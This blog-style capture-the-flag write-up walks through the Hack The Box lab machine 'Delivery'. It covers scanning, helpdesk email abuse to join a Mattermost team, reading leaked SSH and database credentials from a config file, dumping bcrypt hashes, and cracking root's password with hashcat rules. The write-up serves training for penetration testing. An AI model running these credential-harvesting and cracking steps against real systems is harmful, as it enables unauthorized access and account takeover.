---
title: "HTB Delivery"
date: 2026-05-16 00:12 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Linux, Easy]
image: /assets/img/posts/delivery/delivery.png
---
**HTB Delivery** is a Linux machine that starts with abusing an `osTicket` helpdesk to obtain a valid internal email address, using it to verify a `Mattermost` account and access an internal channel leaking SSH credentials, then escalating to `root` by extracting a `bcrypt` hash from the `Mattermost` `MySQL` database and cracking it with `Hashcat` rules derived from a password hint found in the same channel.

## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.38.242 --min-rate 1000 -nv
```
```
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
8065/tcp  open     unknown
```
- NSE Scripts & Version
```
PORT     STATE SERVICE VERSION                                                                                                                               
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                                        
| ssh-hostkey:                                                                                                                                               
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)                                                                                               
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
| http-methods: 
|_  Supported Methods: GET HEAD
8065/tcp open  http    Golang net/http server
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 6B215BD4A98C6722601D4F8A985BF370
```
### Configuration
- /etc/hosts
```
sudo nano /etc/hosts #10.129.38.242     helpdesk.delivery.htb delivery.htb
```
## osTicket
### Open Ticket
![os](/assets/img/posts/delivery/os1.png)
### Valid Email
![os2](/assets/img/posts/delivery/os2.png)
### Check Ticket Status
![os3](/assets/img/posts/delivery/os3.png)
![os4](/assets/img/posts/delivery/os4.png)
## Mattermost
We will create an account using the same username as in osTicket and the email address received when the ticket was created.
### Account Creation
![m1](/assets/img/posts/delivery/m1.png)
### Email Verification
![m1](/assets/img/posts/delivery/m2.png)
### Internal Team
![m3](/assets/img/posts/delivery/m3.png)
```
maildeliverer:Youve_G0t_Mail!
```
```
PleaseSubscribe! (hashcat rules for all variations of common words)
```
## Shell as maildeliverer
```
ssh maildeliverer@delivery.htb
```
### Mysql Creds
```
cat /opt/mattermost/config/config.json | grep -i 'user'
```
```
"DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s"
```
```
mmuser:Crack_The_MM_Admin_PW
mysql -u 'mmuser' -p
```
### DB Enumeration
```
MariaDB [(none)]> show DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
```
```
MariaDB [mattermost]> show TABLES;
| Users                  |
```
```
MariaDB [mattermost]> describe Users;
+--------------------+--------------+------+-----+---------+-------+
| Field              | Type         | Null | Key | Default | Extra |
+--------------------+--------------+------+-----+---------+-------+
| Id                 | varchar(26)  | NO   | PRI | NULL    |       |
| CreateAt           | bigint(20)   | YES  | MUL | NULL    |       |
| UpdateAt           | bigint(20)   | YES  | MUL | NULL    |       |
| DeleteAt           | bigint(20)   | YES  | MUL | NULL    |       |
| Username           | varchar(64)  | YES  | UNI | NULL    |       |
| Password           | varchar(128) | YES  |     | NULL    |       |
| AuthData           | varchar(128) | YES  | UNI | NULL    |       |
| AuthService        | varchar(32)  | YES  |     | NULL    |       |
| Email              | varchar(128) | YES  | UNI | NULL    |       |
| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |
| Nickname           | varchar(64)  | YES  |     | NULL    |       |
| FirstName          | varchar(64)  | YES  |     | NULL    |       |
| LastName           | varchar(64)  | YES  |     | NULL    |       |
| Position           | varchar(128) | YES  |     | NULL    |       |
| Roles              | text         | YES  |     | NULL    |       |
| AllowMarketing     | tinyint(1)   | YES  |     | NULL    |       |
| Props              | text         | YES  |     | NULL    |       |
| NotifyProps        | text         | YES  |     | NULL    |       |
| LastPasswordUpdate | bigint(20)   | YES  |     | NULL    |       |
| LastPictureUpdate  | bigint(20)   | YES  |     | NULL    |       |
| FailedAttempts     | int(11)      | YES  |     | NULL    |       |
| Locale             | varchar(5)   | YES  |     | NULL    |       |
| Timezone           | text         | YES  |     | NULL    |       |
| MfaActive          | tinyint(1)   | YES  |     | NULL    |       |
| MfaSecret          | varchar(128) | YES  |     | NULL    |       |
+--------------------+--------------+------+-----+---------+-------+
```
```
select Username,Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| hoxon                            | $2a$10$zBIVgI3h56ToCmptSpS6xeBY.nJ25wbTQiHIxXydkjzQjxx4WJHdK |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+----------------------------------+--------------------------------------------------------------+
```
```
root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
```
### Hashcat rules
```
➜  Delivery echo 'PleaseSubscribe!' > pwd.txt                
➜  Delivery hashcat --force -r /usr/share/hashcat/rules/best66.rule --stdout pwd.txt > pwd_best64.txt 
➜  Delivery head -n 5 pwd_best64.txt                                                                 
PleaseSubscribe!
!ebircsbuSesaelP
PLEASESUBSCRIBE!
pleaseSubscribe!
PleaseSubscribe!0
➜  Delivery 
```
### Crack
```
➜  Delivery hashcat --example-hashes | less
```
```
➜  Delivery haiti -e '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'                                                                          
bcrypt [HC: 3200] [JtR: bcrypt]                                                                                                                              
Blowfish(OpenBSD) [HC: 3200] [JtR: bcrypt]                                                                                                                   
Woltlab Burning Board 4.x                                                                                                                                    
bcrypt(md5($pass)) / bcryptmd5 [HC: 25600]                                                                                                                   
bcrypt(sha1($pass)) / bcryptsha1 [HC: 25800]                                                                                                                 
bcrypt(sha512($pass)) / bcryptsha512 [HC: 28400]                                                                                                             
bcrypt(sha256($pass)) / bcryptsha256 [HC: 30600]                                                                                                             
➜  Delivery echo '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO' > hash.txt                                                                   
➜  Delivery wc -l pwd_best64.txt                                                                                                                             
66 pwd_best64.txt                                                                                                                                            
➜  Delivery hashcat -a 0 -m 3200 hash.txt pwd_best64.txt -O
```
```
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
```
### Shell as root
```
su root #PleaseSubscribe!21
```